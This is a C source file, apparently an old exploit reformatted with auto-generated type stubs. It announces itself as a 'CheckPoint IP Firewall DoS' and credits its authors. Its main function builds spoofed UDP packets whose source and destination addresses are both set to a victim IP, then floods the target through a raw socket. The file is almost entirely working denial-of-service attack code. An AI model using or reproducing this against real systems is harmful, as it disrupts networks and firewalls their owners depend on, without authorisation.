
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_5__ ;
typedef struct TYPE_9__ TYPE_4__ ;
typedef struct TYPE_8__ TYPE_3__ ;
typedef struct TYPE_7__ TYPE_2__ ;
typedef struct TYPE_6__ TYPE_1__ ;


struct TYPE_9__ {int dest; int check; void* len; void* source; } ;
typedef TYPE_4__ udph_t ;
typedef int u_short ;
typedef int u_long ;
typedef char u_char ;
struct TYPE_8__ {scalar_t__ s_addr; } ;
struct sockaddr_in {TYPE_3__ sin_addr; int sin_family; void* sin_port; } ;
struct sockaddr {int dummy; } ;
typedef scalar_t__ sock_t ;
typedef int port_t ;
struct TYPE_7__ {scalar_t__ s_addr; } ;
struct TYPE_6__ {scalar_t__ s_addr; } ;
struct TYPE_10__ {int ip_hl; int ip_v; int ip_len; int ip_id; int ip_ttl; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; int ip_p; scalar_t__ ip_off; scalar_t__ ip_tos; } ;
typedef TYPE_5__ iph_t ;
typedef scalar_t__ ip_t ;


 int AF_INET ;
 scalar_t__ ERR ;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int IPPROTO_IP ;
 int IPPROTO_RAW ;
 int IPPROTO_UDP ;
 int IP_HDRINCL ;
 int IP_OFF ;
 int PSIZE ;
 int SOCK_RAW ;
 int UDP_OFF ;
 int UDP_SIZE ;
 int atoi (char*) ;
 int checksum (int *,int) ;
 int close (scalar_t__) ;
 int errno ;
 int exit (int ) ;
 int fprintf (int ,char*,...) ;
 void* htons (int) ;
 scalar_t__ inet_addr (char*) ;
 int memset (char*,int ,int) ;
 int rand () ;
 scalar_t__ sendto (scalar_t__,char*,int,int ,struct sockaddr*,int) ;
 scalar_t__ setsockopt (scalar_t__,int ,int ,char**,int) ;
 scalar_t__ socket (int ,int ,int ) ;
 int srand (unsigned int) ;
 int stderr ;
 char* strerror (int ) ;
 scalar_t__ time (int *) ;
 int usage (char*) ;

int main (int argc, char * * argv)
{
  ip_t victim;
  sock_t fd;
  iph_t * ip_ptr;
  udph_t * udp_ptr;
  u_char packet[PSIZE];
  u_char * yes = "1";
  struct sockaddr_in sa;
  port_t aport;
  u_long packets;

  if (argc < 3)
  {
    usage (argv[0]);
  }

  fprintf(stderr, "\n*** CheckPoint IP Firewall DoS\n");
  fprintf(stderr, "*** Bug discovered by: antipent <rtodd@antipentium.com>\n");
  fprintf(stderr, "*** Code by: lore <fiddler@antisocial.com>\n\n");

  if ((victim = inet_addr(argv[1])) == ERR)
  {
    fprintf(stderr, "Bad IP address '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  else if (!(packets = atoi(argv[2])))
  {
    fprintf(stderr, "You should send at least 1 packet\n");
    exit(EXIT_FAILURE);
  }

  else if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERR)
  {
    fprintf(stderr, "Couldn't create raw socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  else if ((setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &yes, 1)) == ERR)
  {
    fprintf(stderr, "Couldn't set socket options: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  srand((unsigned)time(((void*)0)));

  if (argc > 3)
  {
    aport = htons(atoi(argv[3]));
  }
  else
  {
    aport = htons(rand() % 65535 + 1);
  }

  fprintf(stderr, "Sending packets: ");

  while (packets--)
  {

    memset(packet, 0, PSIZE);

    ip_ptr = (iph_t *)(packet + IP_OFF);
    udp_ptr = (udph_t *)(packet + UDP_OFF);

    ip_ptr->ip_hl = 5;
    ip_ptr->ip_v = 4;
    ip_ptr->ip_tos = 0;
    ip_ptr->ip_len = PSIZE;
    ip_ptr->ip_id = 1234;
    ip_ptr->ip_off = 0;
    ip_ptr->ip_ttl = 255;
    ip_ptr->ip_p = IPPROTO_UDP;
    ip_ptr->ip_sum = 0;
    ip_ptr->ip_src.s_addr = victim;
    ip_ptr->ip_dst.s_addr = victim;

    udp_ptr->source = htons(rand() % 65535 + 1);
    udp_ptr->dest = aport;
    udp_ptr->len = htons(UDP_SIZE);
    udp_ptr->check = checksum((u_short *)ip_ptr, PSIZE);

    sa.sin_port = htons(aport);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = victim;

    if ((sendto(fd,
                packet,
                PSIZE,
                0,
                (struct sockaddr *)&sa,
                sizeof(struct sockaddr_in))) == ERR)
    {
      fprintf(stderr, "Couldn't send packet: %s\n",
        strerror(errno));
      close(fd);
      exit(EXIT_FAILURE);
    }
    fprintf(stderr, ".");

  }

  fprintf(stderr, "\n");
  close(fd);

  return (EXIT_SUCCESS);
}
